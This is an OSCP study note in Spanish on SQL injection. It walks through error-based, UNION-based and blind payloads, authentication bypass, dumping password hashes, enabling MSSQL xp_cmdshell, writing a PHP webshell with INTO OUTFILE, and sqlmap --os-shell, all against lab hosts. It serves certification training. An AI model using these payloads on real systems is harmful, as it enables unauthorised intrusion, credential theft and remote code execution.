---
tipo: modulo
modulo: 10
estado: repasado
tags:
  - oscp
  - explotacion
  - web
  - linux
  - windows
fecha: 2026-09-28
---

# 10 - SQL Injection Attacks

> [!abstract] Resumen
> **SQL Injection (SQLi)**: manipular las queries SQL que la app intercambia con la BD porque el input del usuario se concatena en la query **sin sanear**. Nº3 del OWASP Top 10 (`A03:2021-Injection`).
> Tres bloques: **(1) teoría y tipos de BD** (sintaxis de MySQL vs MSSQL), **(2) explotación manual** (error-based, UNION-based y blind boolean/time-based) y **(3) ejecución de código** (MSSQL `xp_cmdshell`, MySQL `INTO OUTFILE` webshell, y automatización con **sqlmap**).
> Objetivos según impacto: **bypass de autenticación**, **dump de credenciales/datos** y **RCE**.

## Conceptos clave
- **SQLi**: extender la query original para acceder a tablas/datos que normalmente no serían accesibles. Causa raíz: input concatenado directamente en la query (ver PHP `$_POST` → `$sql_query`).
- **In-band**: el resultado de la query se ve en la respuesta de la app. Sub-tipos: **error-based** (la app muestra errores SQL) y **UNION-based** (concatenar un segundo `SELECT`).
- **Blind**: la BD nunca devuelve datos; se infiere por comportamiento → **boolean-based** (respuesta distinta según TRUE/FALSE) o **time-based** (`sleep()` según TRUE/FALSE).
- **Comentario de cierre**: `-- ` (dos guiones + **espacio**) corta el resto de la query. En los ejemplos se trailea con `//` para visibilidad y evitar truncado de whitespace: `-- //`.
- **UNION** requiere: mismo **nº de columnas** que la query original + **tipos compatibles** por columna (col 1 suele ser `id`=int → mete strings en columnas de la derecha).
- **`information_schema`**: BD de metadatos (tablas/columnas). Base de la enumeración una vez confirmada la inyección.
- **RCE**: MSSQL → `xp_cmdshell` (deshabilitado por defecto, hay que activarlo). MySQL → sin función directa; `SELECT ... INTO OUTFILE` para escribir una webshell en el web root.

> [!tip] Idea para el examen
> En cualquier input que llegue a una query, prueba primero un `'` para provocar un **error SQL** (confirma inyección). Luego elige vector según lo que veas: si hay error visible → **error-based**; si la respuesta refleja datos → **UNION** (`ORDER BY N` para contar columnas, luego `UNION SELECT` con marcadores `'a1'..'aN'`); si no ves nada → **blind** (`AND 1=1` vs `AND 1=2`, o `sleep()`). Para dumps largos o blind, salta a **sqlmap** (`-u`/`-r`, `-p`, `--dump`, `--os-shell`). MSSQL admin → `xp_cmdshell` para shell casi inmediata.

---

## 10.1 Teoría SQL y tipos de BD

### Por qué existe la vuln
Código PHP de login típico, vulnerable:
```php
<?php
$uname = $_POST['uname'];
$passwd = $_POST['password'];
$sql_query = "SELECT * FROM users WHERE user_name='$uname' AND password='$passwd'";
$result = mysqli_query($con, $sql_query);
?>
```
`$uname` y `$passwd` vienen del POST y se insertan **directamente** en la query sin filtrar → el atacante puede reescribir la sentencia final. (La `i` de `mysqli` es *improved*, no tiene que ver con *injection*.)

### MySQL / MariaDB
Conectarse a una instancia remota desde Kali:
```bash
mysql -u root -p'root' -h 192.168.50.16 -P 3306 --skip-ssl-verify-server-cert
```
| Parte | Qué hace |
|---|---|
| `-u root` | Usuario de BD (no el root del sistema) |
| `-p'root'` | Password pegado a `-p` (sin espacio) |
| `-h` / `-P` | Host / puerto (3306 por defecto) |
| `--skip-ssl` | Alternativa si sale `ERROR 2026 TLS/SSL error` |

Enumeración básica dentro del shell MySQL:
```sql
select version();          -- versión del motor (ej. 8.0.21)
select system_user();      -- usuario@host de la sesión (ej. root@192.168.20.50)
show databases;            -- lista de BDs (information_schema, mysql, performance_schema, sys, test)
-- leer hash de un usuario del propio motor
SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';
```
El password se guarda en `authentication_string` como **Caching-SHA-256** (hash, no plano).

### Microsoft SQL Server (MSSQL)
Integra en Windows. Herramientas: **SQLCMD** (nativa Windows) o **impacket-mssqlclient** (Kali, protocolo TDS):
```bash
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
```
`-windows-auth` fuerza NTLM (en vez de Kerberos).

Enumeración (sintaxis propia de MSSQL):
```sql
SELECT @@version;                                    -- versión SQL Server + Windows
SELECT name FROM sys.databases;                      -- listar BDs (master, tempdb, model, msdb, + custom)
SELECT * FROM offsec.information_schema.tables;       -- tablas de la BD "offsec"
SELECT * FROM offsec.dbo.users;                       -- notación BD.esquema.tabla (dbo)
```
> [!tip] Con `sqlcmd` local hay que terminar cada sentencia con `;` y `GO` en línea aparte. En remoto (impacket) se **omite `GO`** (no es parte del protocolo TDS).

> [!warning] Diferencias de sintaxis MySQL vs MSSQL que hay que tener en cuenta al enumerar:
> - Versión: `version()`/`@@version` (MySQL) vs `@@version` (MSSQL).
> - Listar BDs: `show databases;` (MySQL) vs `SELECT name FROM sys.databases;` (MSSQL).
> - Notación de tabla: `bd.tabla` (MySQL) vs `bd.esquema.tabla` con `dbo` (MSSQL).

---

## 10.2 Explotación manual

### 10.2.1 Error-based (identificación + enumeración)
App de laboratorio: `http://192.168.50.16` (*OffSec - SQLi playground*).

1. Login normal con `offsec`/`jam` → **Invalid password**.
2. Meter un `'` en el Username → **error de sintaxis SQL** ⇒ hay interacción con la BD (in-band con debug activado; en producción esos errores no se muestran).

**Bypass de autenticación** en el campo Username:
```sql
offsec' OR 1=1 -- //
```
La query resultante es `SELECT * FROM users WHERE user_name='offsec' OR 1=1 -- ` → `OR 1=1` siempre true, el `--` comenta el chequeo del password ⇒ **Authentication Successful** (devuelve el primer usuario, normalmente admin).

**Enumerar vía error** (forzar que el error refleje datos con el operador `IN`):
```sql
' or 1=1 in (select @@version) -- //                       -- filtra la versión (8.0.28) en el error
' OR 1=1 in (SELECT * FROM users) -- //                    -- ERROR: solo se puede comparar 1 columna
' or 1=1 in (SELECT password FROM users) -- //             -- devuelve TODOS los hashes (sin saber de quién)
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //   -- hash del admin concreto
```
Los hashes que salen parecen **MD5** (ej. `21232f297a57a5a743894a0e4a801fc3` = `admin`).

> [!tip] El operador `IN` compara un booleano (`1=1`) con un valor que debería ser numérico (la string devuelta) → el "Truncated incorrect DOUBLE value" del warning **filtra el dato**. Solo se puede sacar **una columna a la vez**.

### 10.2.2 UNION-based
App: `http://192.168.50.16/search.php` (*Customer Search Portal*). Query vulnerable:
```php
$query = "SELECT * from customers WHERE name LIKE '".$_POST["search_input"]."%'";
```

**Paso 1 — contar columnas** con `ORDER BY` (falla cuando la columna no existe):
```sql
' ORDER BY 1-- //     -- ir subiendo: ORDER BY 6 da "Unknown column '6' in 'order clause'" ⇒ hay 5 columnas
```

**Paso 2 — ver qué columnas se pintan** con marcadores:
```sql
%' UNION SELECT 'a1', 'a2', 'a3', 'a4', 'a5' -- //   -- en pantalla salen a2,a3,a4,a5 (la col 1=id no se muestra)
```

**Paso 3 — enumerar** (colocar las funciones en columnas que sí se muestran y sean compatibles de tipo):
```sql
%' UNION SELECT database(), user(), @@version, null, null -- //   -- col1 (id/int) NO muestra database()
' UNION SELECT null, null, database(), user(), @@version -- //    -- corregido: db=offsec, user=root@172.21.0.3, v=8.0.28
```

**Paso 4 — mapear tablas/columnas** de la BD actual:
```sql
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
```
Descubre la tabla `users` con columna `password`.

**Paso 5 — dump de la tabla `users`**:
```sql
' UNION SELECT null, username, password, description, null FROM users -- //
```
Saca usuarios + hashes MD5 (admin, offsec, boba, han…).

### 10.2.3 Blind SQLi
App: `http://192.168.50.16/blindsqli.php?user=offsec` (parámetro `user` en la URL). No devuelve el resultado de la query; se infiere.

**Boolean-based** (la página muestra el registro solo si la condición es true):
```
http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //
```
`1=1` siempre true → devuelve datos si el usuario existe. Comparar contra `AND 1=2` o un usuario inexistente.

**Time-based** (medir el retardo de respuesta):
```
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
```
Si el user existe y la condición es true → la app **tarda ~3 s**. Muy lento a mano ⇒ automatizar con sqlmap.

> [!warning] Con blind, prueba **siempre** el comportamiento con un valor válido (`offsec`) y uno inexistente para tener una línea base clara de TRUE vs FALSE.

---

## 10.3 Ejecución de código (manual y automatizada)

### 10.3.1 MSSQL — `xp_cmdshell`
Pasa una string a una shell del SO y devuelve la salida como filas. **Deshabilitado por defecto**; una vez activo se llama con `EXECUTE` (no `SELECT`). Requiere permisos (el Administrator los tiene).
```sql
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';     -- ej. nt service\mssql$sqlexpress
```
Con esto ya se puede subir a una reverse shell estándar.

### 10.3.2 MySQL — webshell con `INTO OUTFILE`
MySQL no tiene función de RCE directa, pero `SELECT ... INTO OUTFILE` escribe ficheros si la ruta es **escribible por el usuario del SO** que corre la BD. Reusando el UNION del search.php:
```sql
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```
Da un error de tipo de retorno, pero **el fichero se escribe igual**. Confirmar:
```bash
curl "http://192.168.50.16/tmp/webshell.php?cmd=id"    # uid=33(www-data) ...
```

### 10.3.3 Automatización — sqlmap
Ver nota completa en [[SQLMap]]. Alto volumen de tráfico ⇒ **nada sigiloso**, no usar de primeras en engagements que exijan pasar desapercibido.
```bash
# detectar (parámetro GET)
sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user
# dumpear la BD actual (blind time-based = lento pero saca todos los hashes)
sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump
# shell interactiva desde una POST guardada con Burp (UNION-based, mejor para shell)
sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"
```
`--os-shell` sube un file stager + backdoor al web root y da una shell (`id` → `www-data`).

---

## Ejemplo práctico
> [!example] Árbol de decisión SQLi
> 1. Meter `'` en el input → ¿**error SQL**? Confirma inyección.
> 2. **Login/auth** → probar `admin' OR 1=1 -- //` (bypass).
> 3. ¿La respuesta **refleja datos**?
>    - Sí + errores visibles → **error-based**: `' or 1=1 in (SELECT password FROM users WHERE username='admin') -- //`.
>    - Sí, salida tabular → **UNION**: `ORDER BY N` (contar cols) → `UNION SELECT 'a1'..'aN'` (ver cols) → `information_schema` → dump.
>    - No devuelve nada → **blind**: `AND 1=1` vs `AND 1=2`, o `AND IF(1=1,sleep(3),0)`.
> 4. **RCE**: MSSQL admin → `xp_cmdshell`; MySQL → `INTO OUTFILE` webshell; o todo con **sqlmap** (`--dump`, `--os-shell`).
> 5. Hashes obtenidos → crackear (MD5/rockyou) en módulos posteriores.

## Relacionado
- Técnicas: [[SQL Injection]] · [[SQLMap]]
- Cheatsheet: [[Web]] · [[Explotacion y Shells]]
- Máquinas donde lo usé: [[]]

## Dudas
> [!question]
> - Confirmar en el lab qué columnas admiten string vs int en UNION cuando no hay pistas visuales (¿fuzzing con `null`?).
> - `INTO OUTFILE` depende de `secure_file_priv` en MySQL moderno — revisar cómo comprobar la ruta escribible.
> - Practicar sqlmap con `--os-shell` sobre UNION vs blind: ¿por qué el time-based no sirve para shell interactiva?
